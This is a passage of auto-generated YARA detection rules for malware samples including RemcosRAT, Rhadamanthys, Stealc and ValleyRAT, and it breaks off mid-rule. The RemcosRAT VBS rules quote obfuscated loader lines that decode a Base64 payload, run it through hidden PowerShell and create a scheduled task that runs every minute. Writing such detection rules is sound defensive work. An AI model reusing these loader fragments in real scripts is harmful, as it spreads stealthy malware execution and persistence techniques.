      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "be5e11f6e953105b0f317defdcdcc60e8c8a59d2d90c63ced02711a7169b200a"
   strings:
      $x1 = "E.text=\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmF" ascii /* score: '72.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                          ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */ /* score: '26.50'*/
      $s5 = "YTEwYmQ3ZGRjNwBtXzAxZGFkOWJmMDllZDQzNmJhZTE4M2VmYmQxODM2Mjc0AG1fMDBjMDM5ZTE5YmExNGQxZWI3OGNhNmU3MWE2Yjc0OTAAbV9lMzAxOGI2MGRlOTU0" ascii /* base64 encoded string 'a10bd7ddc7 m_01dad9bf09ed436bae183efbd1836274 m_00c039e19ba14d1eb78ca6e71a6b7490 m_e3018b60de954' */ /* score: '26.00'*/
      $s6 = "ZmJhNDI0NDhlNTRjY2I5ZGFlOGUyYTYAbV8xNzg5YTc0YjViMzQ0MGI4ODVhYTZkY2I1NzkwNDdlZABtXzVhNzhkMmFlOGU2OTQ1NGQ5NDFkZmJlNjU1ZDMzZmUxAG1f" ascii /* base64 encoded string 'fba42448e54ccb9dae8e2a6 m_1789a74b5b3440b885aa6dcb579047ed m_5a78d2ae8e69454d941dfbe655d33fe1 m_' */ /* score: '26.00'*/
      $s7 = "NTEwZGQ3YzgAbV9mNDFmYzM3NjFlOGU0NzVhYmY3ZDY3ZWZhZGJmMWNjMABtX2IzZmY1OGEwYmE3YzRhNzc5YzYxMGNhODg5ODc5OWVhAG1fYTZjN2YxZTlkMjljNDky" ascii /* base64 encoded string '510dd7c8 m_f41fc3761e8e475abf7d67efadbf1cc0 m_b3ff58a0ba7c4a779c610ca8898799ea m_a6c7f1e9d29c492' */ /* score: '26.00'*/
      $s8 = "M2E0NDJiAG1fMDM3N2VlYTM4Zjg5NDU5ZGI0MTBiNjhiYjU5YzU2NWUAbV9mYjI1OGFhZTc2OTU0MjU4ODY4YmYyYjczYmJiMjUzOQBtX2ExY2JhYjM2Zjk5ZTQ4Yzhh" ascii /* base64 encoded string '3a442b m_0377eea38f89459db410b68bb59c565e m_fb258aae76954258868bf2b73bbb2539 m_a1cbab36f99e48c8a' */ /* score: '24.00'*/
      $s9 = "AFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAERlYnVnZ2VyQnJvd3NhYmxl" ascii /* base64 encoded string ' TargetFrameworkAttribute System.Runtime.Versioning CompilerGeneratedAttribute DebuggerBrowsable' */ /* score: '24.00'*/
      $s10 = "b3JlclN0cgBjb2xsZWN0b3JFeHBsb3JlcgBtX0ZpZWxkU3R1YklEAG1fRXhwbG9yZXJTdHViAEhhbmRsZUFjY2Vzc2libGVSZXNwb25kZXIAdmFsdWUAcHJlZABBcmd1" ascii /* base64 encoded string 'orerStr collectorExplorer m_FieldStubID m_ExplorerStub HandleAccessibleResponder value pred Argu' */ /* score: '24.00'*/
      $s11 = "ODFmNTMwNWNlOWU0M2ZhYTU4ZjBiMDAzN2JmYWRmYwBtXzVmNTBiNzZkZWQ5MDQ1NjVhZjRhMTdkZDdkY2RmZmYyAG1fYmU1ZmVkNzRjMDZhNGM3YmJkMmRlZTVkNGFh" ascii /* base64 encoded string '81f5305ce9e43faa58f0b0037bfadfc m_5f50b76ded904565af4a17dd7dcdfff2 m_be5fed74c06a4c7bbd2dee5d4aa' */ /* score: '24.00'*/
      $s12 = "NuLZQcLlw1eZQoiaZDmvX9P9LLxjlmFdhT8znkJX4meh91UUZY6mq6QG5WYcrNzgqiCredsB1lgMCwBHL1v3y9l6m38W0YikvGu1J0QfTPWtcn1M0/iklWgxGfoIIEpg" ascii /* score: '24.00'*/
      $s13 = "N2I3ODg0ZGNiMmQAbV9kMmY1MDE1YTJkZjI0OGI1OGFhMjBiNTMyYTFlM2E1MgBtX2MwMjI1OTU0MjEwZjQ2YWI5MjM3NjVkNjNjM2Y0NDY2AG1fNmQ2ODY5MWM3NDA4" ascii /* base64 encoded string '7b7884dcb2d m_d2f5015a2df248b58aa20b532a1e3a52 m_c0225954210f46ab923765d63c3f4466 m_6d68691c7408' */ /* score: '24.00'*/
      $s14 = "ZTE5ZDVmY2FjMTVjMGYwZGQ5AG1fMmIxYmVmZWUzYTQ0NGVjZjhjOTE4OTdmYjQxMmYzNTAAbV8zZGU4ZTkwYjU1YjY0MWMzYjBiN2ZlZTUyNTc4ZWZhZABtXzZiY2E3" ascii /* base64 encoded string 'e19d5fcac15c0f0dd9 m_2b1befee3a444ecf8c91897fb412f350 m_3de8e90b55b641c3b0b7fee52578efad m_6bca7' */ /* score: '24.00'*/
      $s15 = "NDNmZjhkMjY1OTAzZjBkMzZlY2UAbV8yMDk3NjRmNzc2YTQ0MTcxYTZmZTIxNzVmYzU4YjBiNwBtX2E1Zjg2MDMxN2I2YjQ0NzQ5NTJhMjk2YjAxYzNhMTMxAG1fNjNk" ascii /* base64 encoded string '43ff8d265903f0d36ece m_209764f776a44171a6fe2175fc58b0b7 m_a5f860317b6b4474952a296b01c3a131 m_63d' */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule RustyStealer_signature_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature).mhtml"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03b49613d35dff8097db363b8943a5a33b10e31cda13df6f5a57f0e28fa7678d"
   strings:
      $s1 = "</head><body><a href=3D\"https://smlwiki.com/\" target=3D\"_blank\" style=3D\"po=" fullword ascii /* score: '27.00'*/
      $s2 = "Content-Location: https://lancewatch.com/logo.gif" fullword ascii /* score: '23.00'*/
      $s3 = "<a href=3D\"https://lancewatch.com/\"><img src=3D\"https://lancewatch.com/logo=" fullword ascii /* score: '22.00'*/
      $s4 = "<a href=3D\"https://lancewatch.com/report.php\"><img src=3D\"https://lancewatc=" fullword ascii /* score: '20.00'*/
      $s5 = "tch.com/\">Go back</a> | <a href=3D\"https://lancewatch.com/lance_images.php\"=" fullword ascii /* score: '20.00'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s7 = "Content-Location: https://lancewatch.com/main.css" fullword ascii /* score: '18.00'*/
      $s8 = "Content-Location: https://lancewatch.com/assets/image0.JPG" fullword ascii /* score: '18.00'*/
      $s9 = "Content-Location: https://lancewatch.com/button4.1.gif" fullword ascii /* score: '18.00'*/
      $s10 = "Content-Location: https://lancewatch.com/assets/face1.jpg" fullword ascii /* score: '18.00'*/
      $s11 = "Content-Location: https://lancewatch.com/assets/stare-crop.jpg" fullword ascii /* score: '18.00'*/
      $s12 = "Content-Location: https://lancewatch.com/button2.1.gif" fullword ascii /* score: '18.00'*/
      $s13 = "Snapshot-Content-Location: https://lancewatch.com/lance-summary.html" fullword ascii /* score: '18.00'*/
      $s14 = "Content-Location: https://lancewatch.com/ass/bg4.webp" fullword ascii /* score: '18.00'*/
      $s15 = "Content-Location: https://lancewatch.com/cycle.php" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7246 and filesize < 200KB and
      8 of them
}

rule RemcosRAT_signature__6633c215 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6633c215.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6633c215d97f3b2e4c3026127c47b276ab104609bc564d2313d6ef5bebaee162"
   strings:
      $s1 = "!RFP 6008878171 IKS 3118219095.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 70KB and
      all of them
}

rule RemcosRAT_signature__6b3897c1 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6b3897c1.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6b3897c1830e668a62a95d9cfc8f335d1acce31da25022b4e2e53ca5926c974b"
   strings:
      $s1 = "// a90eccda-6654-4723-ba8c-d9424b9ff70e - 638918079379485901" fullword ascii /* score: '12.00'*/
      $s2 = "51,56,55,55,57,61,51,56,55,55,57,64,51,64,63,57,55,51,64,62,58,62,51,56,55,55,59,56,51,56,55,55,58,64,51,64,63,64,63,51,64,63,59" ascii /* score: '9.00'*/ /* hex encoded string 'QVUUWaQVUUWdQdcWUQdbXbQVUUYVQVUUXdQdcdcQdcY' */
      $s3 = "55,61,55,51,56,55,55,59,57,51,56,55,55,55,63,51,64,63,58,56,51,56,55,55,56,63,51,64,62,60,63,51,56,55,55,57,58,51,64,62,62,64,51" ascii /* score: '9.00'*/ /* hex encoded string 'UaUQVUUYWQVUUUcQdcXVQVUUVcQdb`cQVUUWXQdbbdQ' */
      $s4 = "64,63,64,55,51,56,55,55,59,55,51,59,58,58,55,51,56,55,55,57,59,51,64,63,64,58,51,64,63,57,58,51,64,63,57,61,51,64,62,61,59,51,64" ascii /* score: '9.00'*/ /* hex encoded string 'dcdUQVUUYUQYXXUQVUUWYQdcdXQdcWXQdcWaQdbaYQd' */
      $s5 = "56,55,55,62,59,51,64,63,58,58,51,56,55,55,59,56,51,64,63,64,57,51,63,59,63,61,51,64,62,62,61,51,64,63,64,59,51,56,55,55,58,55,51" ascii /* score: '9.00'*/ /* hex encoded string 'VUUbYQdcXXQVUUYVQdcdWQcYcaQdbbaQdcdYQVUUXUQ' */
      $s6 = "55,55,61,56,51,64,63,58,64,51,64,63,56,61,51,64,63,59,55,51,64,62,60,63,51,56,55,55,57,59,51,56,55,55,59,57,51,56,55,55,60,59,51" ascii /* score: '9.00'*/ /* hex encoded string 'UUaVQdcXdQdcVaQdcYUQdb`cQVUUWYQVUUYWQVUU`YQ' */
      $s7 = "57,51,64,63,57,63,51,56,55,55,58,55,51,56,55,55,56,63,51,64,63,58,61,51,56,55,55,58,55,51,64,62,60,63,51,64,62,59,62,51,56,55,55" ascii /* score: '9.00'*/ /* hex encoded string 'WQdcWcQVUUXUQVUUVcQdcXaQVUUXUQdb`cQdbYbQVUU' */
      $s8 = "56,55,55,59,60,51,64,61,57,56,51,64,63,57,60,51,56,55,55,58,64,51,64,63,63,61,51,56,55,55,55,57,51,64,63,57,62,51,56,55,55,59,57" ascii /* score: '9.00'*/ /* hex encoded string 'VUUY`QdaWVQdcW`QVUUXdQdccaQVUUUWQdcWbQVUUYW' */
      $s9 = "57,60,51,64,63,64,60,51,56,55,55,60,58,51,56,55,55,59,57,51,64,63,64,57,51,64,63,63,64,51,56,55,55,58,62,51,63,59,63,61,51,64,63" ascii /* score: '9.00'*/ /* hex encoded string 'W`Qdcd`QVUU`XQVUUYWQdcdWQdccdQVUUXbQcYcaQdc' */
      $s10 = "63,64,57,51,64,62,62,62,51,56,55,55,58,59,51,64,62,61,62,51,64,62,64,58,51,64,63,56,64,51,56,55,55,59,57,51,64,62,58,59,51,64,62" ascii /* score: '9.00'*/ /* hex encoded string 'cdWQdbbbQVUUXYQdbabQdbdXQdcVdQVUUYWQdbXYQdb' */
      $s11 = "60,56,51,60,56,51,58,61,51,64,62,62,63,51,56,55,55,60,60,51,64,62,62,63,51,64,63,57,62,51,56,55,55,56,64,51,56,55,55,56,57,51,64" ascii /* score: '9.00'*/ /* hex encoded string '`VQ`VQXaQdbbcQVUU``QdbbcQdcWbQVUUVdQVUUVWQd' */
      $s12 = "59,59,51,64,63,56,64,51,56,55,55,60,56,51,64,64,64,61,51,56,55,55,60,58,51,60,60,58,61,55,51,60,62,57,62,58,51,59,58,58,55,51,56" ascii /* score: '9.00'*/ /* hex encoded string 'YYQdcVdQVUU`VQdddaQVUU`XQ``XaUQ`bWbXQYXXUQV' */
      $s13 = "62,62,59,51,64,62,61,61,51,64,63,58,63,51,56,55,55,58,60,51,64,63,57,59,51,64,63,64,55,51,56,55,55,60,58,51,64,62,63,64,51,56,59" ascii /* score: '9.00'*/ /* hex encoded string 'bbYQdbaaQdcXcQVUUX`QdcWYQdcdUQVUU`XQdbcdQVY' */
      $s14 = "56,55,55,59,61,51,64,63,63,63,51,56,55,55,57,64,51,64,63,64,64,51,56,55,55,60,63,51,64,63,57,62,51,64,63,57,61,51,64,63,63,63,51" ascii /* score: '9.00'*/ /* hex encoded string 'VUUYaQdcccQVUUWdQdcddQVUU`cQdcWbQdcWaQdcccQ' */
      $s15 = "63,62,51,64,63,64,56,51,64,63,58,56,51,56,55,55,56,62,51,64,63,64,61,51,64,63,59,55,51,56,55,55,64,56,51,64,63,57,60,51,56,55,55" ascii /* score: '9.00'*/ /* hex encoded string 'cbQdcdVQdcXVQVUUVbQdcdaQdcYUQVUUdVQdcW`QVUU' */
   condition:
      uint16(0) == 0x0a0d and filesize < 4000KB and
      8 of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__0a31da92 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_0a31da92.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0a31da928cc7330ce41d80e3c21cb47076d2d9f42f773da37d3211a3ced2e2cc"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__66652407 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_66652407.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "66652407eb97ccfbecac8f5d27296bdff89acd7c0d5350a7610ad41863fc8a4d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__6ba75f83 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_6ba75f83.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6ba75f83e8b1bb686aed7968589519fccf57bb96eaafb94a75b2341917f6e8ef"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s5 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__8b962cb0 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_8b962cb0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b962cb04e2472c39a60593ca099b4e1ed00bd580113e9fb356a3fb3870b2be6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "* [n9X" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__c1da7a18 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_c1da7a18.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c1da7a18c6786a25068d00d77be9d4d80f808a60c967ced02a1ddce8b268d979"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "jvnfringens" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__3d291ad5 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_3d291ad5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d291ad5e29f666e9ede501c30dd7803842c28835cc8941d101b7359756e95c7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__6566b5de91bbc293c6eea50eb6537989_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_6566b5de91bbc293c6eea50eb6537989(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "88a82bdbb8f6efe6448316c05c881d65b564efb9bd7588363683fa07d11b8a86"
   strings:
      $s1 = "QuickAssist.exe" fullword wide /* score: '22.00'*/
      $s2 = "            <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s3 = ".?AV?$ProcessorBase@VDataTransformer@@@@" fullword ascii /* score: '15.00'*/
      $s4 = "        <dpiAware  xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s5 = "            processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
      $s6 = ":*:6:C:]:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'l' */
      $s7 = "=.2)#~)=/2)#" fullword ascii /* score: '9.00'*/ /* hex encoded string '"' */
      $s8 = ";!<(>3>9>?>" fullword ascii /* score: '9.00'*/ /* hex encoded string '9' */
      $s9 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Rhadamanthys_signature__7ccdf26f81c5c13d798e8a7ffab09084_imphash__155f5320 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_7ccdf26f81c5c13d798e8a7ffab09084(imphash)_155f5320.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "155f53209e7e4aacf1efb3c929a2aaa659f98f9dd3ff703d0eed9ff7379a7da3"
   strings:
      $s1 = "            <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Stealc_signature__f3f2becbefab403299b367e6b024bf66_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_f3f2becbefab403299b367e6b024bf66(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bef6f8cef8f5d75ead900b2ea1a3c8fd39aa705a9bb8a66e4e0229ccdcdd5cb"
   strings:
      $s1 = "TTTracer.exe" fullword wide /* score: '22.00'*/
      $s2 = "OpenProcessToken failed. Error: " fullword ascii /* score: '21.00'*/
      $s3 = "First GetTokenInformation failed. Error: " fullword ascii /* score: '15.00'*/
      $s4 = "LookupAccountSid failed. Error: " fullword ascii /* score: '13.00'*/
      $s5 = "7-^4=6-^4~" fullword ascii /* score: '9.00'*/ /* hex encoded string 'td' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule ValleyRAT_signature__156a54e97cf1946122707df0c1097408_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_156a54e97cf1946122707df0c1097408(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cf368705c5cd6cd0f824d5ca8b5f187488fbd4d436a93a60f57f8cfd6a004398"
   strings:
      $s1 = "      <!--See http://msdn.microsoft.com/en-us/library/hh848036%28v=vs.85%29.aspx for definitions-->" fullword ascii /* score: '17.00'*/
      $s2 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s4 = "        <ms_asmv3:requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s5 = "           processorArchitecture=\"x86\" />" fullword ascii /* score: '10.00'*/
      $s6 = "     processorArchitecture=\"x86\" />" fullword ascii /* score: '10.00'*/
      $s7 = "VSJITDEBUGGER.ICO(" fullword wide /* score: '10.00'*/
      $s8 = "           publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s9 = "      <!--Windows Vista -->" fullword ascii /* score: '8.00'*/
      $s10 = "      <!--Windows 7 -->" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule ValleyRAT_signature_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6f469bcf94ec8965587220ac917b235ec7f3c3bd0c29a65bb0726ce2489736f4"
   strings:
      $s1 = "D:\\jenkins_agent\\workspace\\windows_desktop_new_installer_build\\line-updater\\LineInstaller\\bin\\LineInstaller.pdb" fullword ascii /* score: '27.00'*/
      $s2 = "      <assemblyIdentity type='win32'     name='Microsoft.Windows.Common-Controls' version='6.0.0.0'     processorArchitecture='*" ascii /* score: '27.00'*/
      $s3 = " https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -->" fullword ascii /* score: '26.00'*/
      $s4 = "SHCore.dll" fullword wide /* score: '23.00'*/
      $s5 = "LineInstaller.exe" fullword wide /* score: '22.00'*/
      $s6 = "ZcInst.exe" fullword wide /* score: '22.00'*/
      $s7 = "      <assemblyIdentity type='win32'     name='Microsoft.Windows.Common-Controls' version='6.0.0.0'     processorArchitecture='*" ascii /* score: '21.00'*/
      $s8 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s9 = "!http://ocsp.globalsign.com/rootr30;" fullword ascii /* score: '20.00'*/
      $s10 = "Hapi-ms-win-core-synch-l1-2-0.dll" fullword wide /* score: '20.00'*/
      $s11 = "OK]I agree to the [LY Corporation Common Terms of Use|https://terms.line.me/line_terms?lang=en].HAn error occurred while install" wide /* score: '18.00'*/
      $s12 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s13 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s14 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s15 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule RemcosRAT_signature__6f0877cd {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6f0877cd.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6f0877cdcc9b0b0c6837fe90e9f8d2492f36471cb57a477e24b57530d16b5ec9"
   strings:
      $s1 = "execute(\"\" & aqxhywfjuolxpvtu & \".Run \"\"powershell.exe \" & fpuwlgrbedmduksu & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & aqxhywfjuolxpvtu & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "TnOj = dnBWh.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s4 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "dnBWh.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s6 = "dnBWh.Run JKmvD, lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set dnBWh = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & Mojtb & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "JKmvD = \"scht\" & \"asks /cr\" & \"eate /tn \" & Mojtb & \" /tr \"\"\" & mJbel & \"\"\" /sc min\" & \"ute /mo 1\"" fullword wide /* score: '8.00'*/
      $s15 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature__932791f5 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_932791f5.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "932791f59371b7a69c112bedde0a369f77b03ce6ab3f4cb1c08be7ff49846137"
   strings:
      $s1 = "execute(\"\" & ywhmummgpupawtmh & \".Run \"\"powershell.exe \" & bcucuvkkoaudyrem & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & ywhmummgpupawtmh & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "TnOj = dnBWh.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s4 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "dnBWh.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s6 = "dnBWh.Run JKmvD, lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set dnBWh = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
